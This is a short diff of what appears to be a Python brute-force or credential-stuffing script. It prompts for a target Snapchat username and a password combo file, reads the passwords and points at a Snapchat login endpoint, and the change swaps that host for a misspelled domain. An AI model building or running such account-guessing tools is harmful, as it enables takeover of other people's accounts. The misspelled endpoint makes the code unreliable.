@@ -1,3 +1,4 @@
+
 import requests
 import json
 from time import sleep
@@ -49,7 +50,7 @@ if d1mod == "1":
   user = input("USERNAME OF SNAPCHAT =>l3aah136 ")
   flo = input("FILE PASSWORD (COMBO) => ")
 
-  url = "https://gcp.api.snapchat.com/scauth/login"
+  url = "https://gcp.api.snapchnat.com/scauth/login"
 
   password = open(flo).read().splitlines()
 
